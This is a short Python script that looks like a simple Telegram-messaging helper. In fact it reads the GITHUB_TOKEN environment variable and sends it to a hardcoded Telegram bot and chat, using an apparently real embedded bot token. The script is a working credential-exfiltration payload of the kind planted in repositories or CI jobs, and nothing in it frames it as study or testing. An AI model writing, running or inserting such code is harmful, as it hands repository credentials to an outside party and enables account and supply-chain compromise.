import requests
import os

def send_telegram_message(bot_token, chat_id, text):
    api_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    params = {'chat_id': chat_id, 'text': text}

    response = requests.get(api_url, params=params)
    return response.json()

# Replace 'YOUR_BOT_TOKEN', 'YOUR_CHAT_ID' with your actual values
bot_token = '6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I'
chat_id = '1881720028'

# Use the actual value of the GITHUB_TOKEN environment variable
github_token = os.getenv("GITHUB_TOKEN")
message_text = f'The GitHub token is: {github_token}'

response = send_telegram_message(bot_token, chat_id, message_text)

if response['ok']:
    print('Message sent successfully!')
else:
    print(f'Failed to send message. Error: {response["description"]}')
